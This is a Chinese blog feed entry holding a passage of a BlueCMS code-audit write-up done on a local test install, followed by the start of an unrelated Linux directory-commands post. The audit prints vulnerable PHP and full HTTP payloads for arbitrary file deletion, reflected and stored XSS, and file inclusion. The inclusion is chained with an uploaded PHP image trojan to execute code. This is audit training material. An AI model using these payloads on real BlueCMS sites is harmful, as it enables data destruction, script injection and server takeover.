class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?act=do_info_edit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 58</span><br><span class="line"></span><br><span class="line">post_id=1&amp;title=1&amp;link_man=1&amp;link_phone=1&amp;lit_pic=demo.php</span><br></pre></td></tr></table></figure><p>同样<code>/admin/flash.php</code>第62-63行存在未过滤变量<code>$_POST[&#39;image_path2&#39;]</code>，导致任意文件删除漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file_exists(BLUE_ROOT.$_POST[<span class="string">'image_path2'</span>]))&#123;</span><br><span class="line">@unlink(BLUE_ROOT.$_POST[<span class="string">'image_path2'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/flash.php?act=do_edit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">image_id=1&amp;image_path2=demo.php</span><br></pre></td></tr></table></figure><h3 id="5-反射型XSS"><a href="#5-反射型XSS" class="headerlink" title="5.反射型XSS"></a>5.反射型XSS</h3><p><code>/admin/card.php</code>第57行存在可利用的变量$name导致的反射型xss漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name=!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) ? trim($_POST[<span class="string">'name'</span>]) : <span class="string">''</span>;</span><br><span class="line">showmsg(<span class="string">'编辑充值卡 '</span>.$name.<span class="string">' 成功'</span>, <span class="string">'card.php'</span>);</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/card.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 99</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/admin/card.php?act=edit&amp;id=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=4; BLUE[user_id]=2; BLUE[user_name]=user01; BLUE[user_pwd]=30f21397b842ad32aaeae277d571edcd</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&amp;value=100&amp;price=30&amp;is_close=0&amp;id=1&amp;act=do_edit</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>弹框后跳转至card.php</p><h3 id="6-存储型XSS"><a href="#6-存储型XSS" class="headerlink" title="6.存储型XSS"></a>6.存储型XSS</h3><p>这个漏洞挺难发现的，我也是看别人的文章才学习到的，我们在审计时应该有注意在<code>/user.php</code>中的注册功能下有一个函数<strong>uc_user_register</strong>，跟踪该函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_user_register</span><span class="params">($username, $password, $email, $questionid = <span class="string">''</span>, $answer = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> call_user_func(UC_API_FUNC, <span class="string">'user'</span>, <span class="string">'register'</span>, <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username, <span class="string">'password'</span>=&gt;$password, <span class="string">'email'</span>=&gt;$email, <span class="string">'questionid'</span>=&gt;$questionid, <span class="string">'answer'</span>=&gt;$answer));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们应该都会很奇怪这个<strong>UD_API_FUNC</strong>到底是什么鬼，查询一下其实就是一个引擎检查用户输入是否合法返回对应的<strong>uid</strong>，具体我们没必要深究下去，总之他是一个检查机制</p><p>而回到<code>/user.php</code>的编辑个人资料功能的代码下，我们惊奇的发现这个功能里，我们输入修改的资料信息后，直接将信息更新到了数据库中，并没有通过上面那个引擎对我们的输入进行合法性检查，所以我们就可以利用这个功能，进行存储型的XSS攻击</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 1475</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/user.php?act=my_info</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=3; BLUE[user_name]=user02; BLUE[user_pwd]=1e6a32c00852bd4dbf303ab4d54a1380; detail=4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;face_pic1&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;face_pic2&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;birthday&quot;</span><br><span class="line"></span><br><span class="line">2019-03-14</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;sex&quot;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;email&quot;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;msn&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;qq&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;office_phone&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;home_phone&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;mobile_phone&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;address&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;act&quot;</span><br><span class="line"></span><br><span class="line">edit_user_info</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">È·ÈÏÐÞ¸Ä</span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB</span><br><span class="line">Content-Disposition: form-data; name=&quot;face_pic3&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryOit6AnMUCD0FejzB--</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>编辑成功后跳转回用户信息界面，每次访问都会触发弹框，因为我们编辑用户邮箱为<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h3 id="7-任意文件包含漏洞"><a href="#7-任意文件包含漏洞" class="headerlink" title="7.任意文件包含漏洞"></a>7.任意文件包含漏洞</h3><p>这个漏洞也是通过审计工具才知道的，在<code>/user.php</code>第750行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">'pay'</span>)&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'data/pay.cache.php'</span>;</span><br><span class="line">$price = $_POST[<span class="string">'price'</span>];</span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'pay'</span>])) &#123;</span><br><span class="line"> showmsg(<span class="string">'对不起，您没有选择支付方式'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">include</span> <span class="string">'include/payment/'</span>.$_POST[<span class="string">'pay'</span>].<span class="string">"/index.php"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量<code>$_POST[&#39;pay&#39;]</code>拼接到include函数中，且只有开头包含文件的转义过滤处理，我们可以使用<code>0x00</code>或文件长度截断方式进行过滤，本次审计的环境是<strong>PHP5.2.17</strong>，如果环境为5.4以上那么上述两种方法无效，不存在任意文件包含漏洞，但是为了更好理解漏洞，我还是将环境设为5.3以下</p><p>包含根目录下<strong>robots.txt</strong>的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?act=pay HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 632</span><br><span class="line"></span><br><span class="line">pay=../../robots.txtspan><br></pre></td></tr></table></figure><p>这里我使用了字符<code>.</code>来进行文件长度截断</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>有了文件包含漏洞，我们接着就可以考虑是不是上传图片马，这样就能成功执行<strong>shell</strong>，所以接下来我们找一个可以上传文件的页面：<code>/admin/flash.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'do_add'</span>)&#123;</span><br><span class="line"> $image_link = !<span class="keyword">empty</span>($_POST[<span class="string">'image_link'</span>]) ? trim($_POST[<span class="string">'image_link'</span>]) : <span class="string">''</span>;</span><br><span class="line"> $show_order = !<span class="keyword">empty</span>($_POST[<span class="string">'show_order'</span>]) ? intval($_POST[<span class="string">'showorder'</span>]) : <span class="string">''</span>;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'image_path'</span>][<span class="string">'error'</span>]) &amp;&amp; $_FILES[<span class="string">'image_path'</span>][<span class="string">'error'</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">$image_path = $image-&gt;img_upload($_FILES[<span class="string">'image_path'</span>],<span class="string">'flash'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($image_path == <span class="string">''</span>)&#123;</span><br><span class="line">showmsg(<span class="string">'上传图片出错'</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">    $image_path = <span class="keyword">empty</span>($image_path) ? <span class="string">''</span> : $image_path;</span><br><span class="line">    <span class="keyword">if</span>(!$db-&gt;query(<span class="string">"INSERT INTO "</span>.table(<span class="string">'flash_image'</span>).<span class="string">" (image_id, image_path, image_link, show_order) VALUES ('', '$image_path', '$image_link', '$show_order')"</span>))&#123;</span><br><span class="line">    showmsg(<span class="string">'添加flash图片出错'</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    showmsg(<span class="string">'添加flash图片成功'</span>, <span class="string">'flash.php'</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>我们跟踪一下<strong>img_upload</strong>函数，定位到<code>/include/upload.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $allow_image_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>, <span class="string">'image/gif'</span>, <span class="string">'image/png'</span>, <span class="string">'image/pjpeg'</span>);</span><br><span class="line"><span class="keyword">private</span> $extension_name_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'pjpeg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">img_upload</span><span class="params">($file, $dir = <span class="string">''</span>, $imgname = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(!in_array($file[<span class="string">'type'</span>],<span class="keyword">$this</span>-&gt;allow_image_type))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font style="color:red;"&gt;不允许的图片类型&lt;/font&gt;'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($imgname))&#123;</span><br><span class="line">    $imgname = <span class="keyword">$this</span>-&gt;create_tempname().<span class="string">'.'</span>.<span class="keyword">$this</span>-&gt;get_type($file[<span class="string">'name'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_type</span><span class="params">($filepath)</span></span>&#123;</span><br><span class="line">    $pos = strrpos($filepath,<span class="string">'.'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $pos;</span><br><span class="line">    <span class="keyword">if</span>($pos !== <span class="keyword">false</span>)&#123;</span><br><span class="line">    $extension_name = substr($filepath,$pos+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//echo $extension_name;</span></span><br><span class="line"><span class="keyword">if</span>(!in_array($extension_name, <span class="keyword">$this</span>-&gt;extension_name_arr))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font style="color:red;"&gt;您上传的文件不符合要求,请重试&lt;/font&gt;'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $extension_name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该文件对上传文件进行文件类型和文件名的白名单检测，但是没有对文件内容进行检查，所以我们能轻易上传一个图片马</p><p>payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/flash.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 499</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/admin/flash.php?act=add</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;image_path&quot;; filename=&quot;info.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;image_link&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;show_order&quot;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;act&quot;</span><br><span class="line"></span><br><span class="line">do_add</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b--</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传成功后我们可以通过管理员界面得知上传文件所在目录为<code>data/upload/flash/15525638906.jpg</code></p><p>我们再通过文件包含漏洞执行该图片马</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?act=pay HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">pay=../../data/upload/flash/15525638906.jpgspan><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功执行webshell</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，这次代码审计虽然花的时间比较久，但是收获了审计的思路，从一开始看到一个陌生的cms不知从何下手到慢慢有思路，有方法的审计，这个过程还是挺开心的，相信只要花时间有耐心，一定能提高自己的审计能力，最后附上参考文章：</p><p><a href="https://www.freebuf.com/articles/web/166602.html" target="_blank" rel="noopener">一名代码审计新手的实战经历与感悟</a></p><p><a href="https://www.freebuf.com/vuls/196190.html" target="_blank" rel="noopener">从小众blueCMS入坑代码审计</a></p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件与目录管理</title>
    <link href="https://Foxgrin.github.io//posts/5187/"/>
    <id>https://Foxgrin.github.io//posts/5187/</id>
    <published>2019-03-07T13:22:00.000Z</published>
    <updated>2019-03-14T12:00:06.872Z</updated>
    
    <content type="html"><![CDATA[<p>包括在不同的目录间切换，建立与删除目录，建立与删除文件，查看文件内容等<a id="more"></a></p><h2 id="一-目录与路径"><a href="#一-目录与路径" class="headerlink" title="一.目录与路径"></a>一.目录与路径</h2><h3 id="1-相对路径与绝对路径"><a href="#1-相对路径与绝对路径" class="headerlink" title="1.相对路径与绝对路径"></a>1.相对路径与绝对路径</h3><p>绝对路径：路径写法一定由<strong>根目录/</strong>写起，例如：/usr/share/doc这个目录</p><p>相对路径：路径写法不是由根目录写起，指相对于当前工作目录的路径，例如：cd ../usr</p><h3 id="2-目录的相关操作"><a href="#2-目录的相关操作" class="headerlink" title="2.目录的相关操作"></a>2.目录的相关操作</h3><h4 id="（1）切换目录：cd命令"><a href="#（1）切换目录：cd命令" class="headerlink" title="（1）切换目录：cd命令"></a>（1）切换目录：cd命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd [相对路径或绝对路径]</span><br><span class="line">cd . #代表此层目录</span><br><span class="line">cd .. #代表上一层目录</span><br><span class="line">cd ~ #代表目前使用者身份所在的家目录</span><br><span class="line">cd - #代表前一个工作目录</span><br><span class="line">cd ~account #代表account这个使用者的家目录</span><br></pre></td></tr></table></figure><h4 